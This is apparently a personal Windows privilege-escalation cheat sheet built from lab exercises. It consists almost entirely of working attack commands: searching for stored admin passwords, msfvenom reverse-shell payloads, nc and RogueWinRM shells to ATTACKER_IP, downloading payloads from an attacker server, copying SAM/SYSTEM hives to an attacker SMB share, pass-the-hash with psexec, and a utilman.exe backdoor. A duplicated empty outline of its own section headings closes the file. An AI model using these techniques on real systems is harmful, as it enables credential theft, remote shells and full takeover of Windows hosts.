# Look for Admin passwords in these location:

# Look for Admin passwords in these location:

## Files

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml 
## Cmd.exe history

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
## Powershell history

type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
## Saved creds

cmdkey /list  
runas /savecred /user:admin cmd.exe
 
## Web server database

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 
type C:\inetpub\wwwroot\web.config | findstr connectionString
 
## PuTTY proxy configuration file

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
CTF -----------

## Scheduled tasks

schtasks  
schtasks /query /tn <TASKNAME> /fo list /v  
icacls <executable path>  
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > <executable file>
 
## AlwaysInstallElevated

(Check for the registry keys)  
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer￼C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.171.137 LPORT=LOCAL_PORT -f msi -o malicious.msi
 
Setup metasploit handler  
Then,
 
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
## Windows Services

Sc qc  
Look in registry editor: HKLM\SYSTEM\CurrentControlSet\Services\  
If Security subkey does NOT exist, it may be exploitable:
 
Sc qc <service (WindowsScheduler)  
Icacls C:\PROGRA~2\SYSTEM~1\WService.exe  
See if you can modify: Everyone:(I)(M)
 
Create payload:  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 
Python3 -m http.server  
wget [http://ATTACKER_IP:8000/rev-svc.exe](http://ATTACKER_IP:8000/rev-svc.exe) -O rev-svc.exe
 
cd C:\PROGRA~2\SYSTEM~1\  
move WService.exe WService.exe.bkp (move old svc to backup)  
move C:\Users\thm-unpriv\rev-svc.exe WService.exe (rename payload)  
icacls WService.exe /grant Everyone:F (grant full perms for everyone)
 
Wait for service to restart (could be days), then catch with nc listener  
(OR sc stop <service> / sc start <service> - if you have the perms)
 
## Unquoted Service Paths

Sc qc "vncserver"  
"C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service  
VS  
Sc qc "disk sorter enterprise"  
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
 
^^ doesn’t have quotes, so is vulnerable.  
Cd C:\MyPrograms
 
Create payload on kali:  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 
Python3 -m http.server  
wget [http://ATTACKER_IP:8000/rev-svc.exe](http://ATTACKER_IP:8000/rev-svc.exe) -O rev-svc.exe
 
Move re-svc.exe Disk.exe
 - Nc listener on kali 
Wait for service to restart:  
(OR sc stop "disk sorter enterprise" / sc start "disk sorter enterprise" - if you have the perms)
 
## Insecure Service Permissions

[Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)64.exe -qlc <service>  
If the service DACL is modifiable, you can reconfigure a service to point to any binary:  
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users  
SERVICE_ALL_ACCESS
 
Change the service's executable path to your payload:
 
sc config <service> binPath= "<path-to-payload" obj= LocalSystem  
^^(Mind spaces after the ='s)
 
# Windows Privileges:

whoami /all
 
## SeBackup or SeRestore

If you have SeBackup or SeRestore permissions, you can dump local admin password hash:  
Open cmd prompt as Administrator (from your account with the above perms)  
C:\> reg save hklm\system C:\Users\<USER>\system.hive  
C:\> reg save hklm\sam C:\Users\<USER>\sam.hive
 
Create SMB server with impacket to transfer the Hashes:  
(kali)  
Mkdir share  
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username <USERNAME> -password <PASSWORD> public share
 
(windows)  
C:\> copy C:\Users\THMBackup\sam.hive [\\ATTACKER_IP\public\](file:///\\ATTACKER_IP\public\)￼C:\> copy C:\Users\THMBackup\system.hive [\\ATTACKER_IP\public\](file:///\\ATTACKER_IP\public\)
 
Use impacket to retrive password hashes:  
(kali)  
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
 
Use impacket to pass the hash with SYSTEM permissions:  
(kali)  
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<target_IP>
 
## SeTakeOwnership

Take ownership of service that has SYSTEM perms:  
takeown /f C:\Windows\System32\Utilman.exe
 
Give yourself full perms of executable:  
icacls C:\Windows\System32\Utilman.exe /grant <USER>:F
 
Replace utilman.exe with cmd.exe:  
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
 
Now, lock screen and click on ease of access button at bottom right (utilman)  
Should have SYSTEM prompt
 
## SeImpersonate / SeAssignPrimaryToken

if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.  
In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges.  
The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.  
If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
   

Let's start by assuming we have already compromised a website running on IIS and that we have planted a **web shell** on the following address:  
[http://10.10.177.115/](http://10.10.177.115/)  
Determine if you have both permissions above, with: whoami /priv
 
Put RogueWinRM.exe on the target machine with Python3 server or similar.
 
Type the following in the **WEB SHELL** to get REV shell on your machine:  
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
 
## Unpatched Software

Wmic  
Use wmic to list available products on the host, so you can google for vulnerabilities:
 
wmic product get name,version,vendor
 
## Other PrivEsc Tools

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)  
[PrivescCheck](https://github.com/itm4n/PrivescCheck) (might need to do: Set-ExecutionPolicy Bypass -Scope process -Force)

1. wes.py --update
2. Run 'systeminfo' on target, save to .txt file, transfer to kali
3. wes.py systeminfo.txt

Metasploit (if u have a meterpreter, run: multi/recon/local_exploit_suggester)

## Files
 
## Cmd.exe history
 
## Powershell history
 
## Saved creds
 
## Web server database
    
## PuTTY proxy configuration file
 
## Scheduled tasks
 
## AlwaysInstallElevated
       
## Windows Services
         

## Unquoted Service Paths
          
## Insecure Service Permissions
    
# Windows Privileges:
 
## SeBackup or SeRestore
       
## SeTakeOwnership
      

## SeImpersonate / SeAssignPrimaryToken
       
## Unpatched Software
   

## Other PrivEsc Tools

[WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) (from kali attack box)